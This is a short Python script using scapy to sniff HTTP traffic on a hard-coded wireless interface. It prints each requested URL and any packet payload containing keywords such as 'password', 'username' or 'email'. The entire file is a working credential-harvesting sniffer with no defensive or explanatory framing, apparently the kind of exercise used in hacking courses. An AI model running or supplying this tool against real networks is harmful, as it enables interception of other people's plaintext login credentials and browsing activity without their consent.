import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False , prn=print_sniffed_packets ) 

def get_url(packet):
    url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
    return url
def get_credential(packet):
    if packet.haslayer(scapy.Raw):
            load = str(packet[scapy.Raw].load)
            keywords = ["email" , "username" , "password" , "login" , "user" ]
            for key in keywords:
                if key in load:
                    return load

def print_sniffed_packets(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("link >>> ",url)
        cred = get_credential(packet)
        if cred:
            print("cred >>> ",cred)
        
sniff("wlx08ea35e1b42d")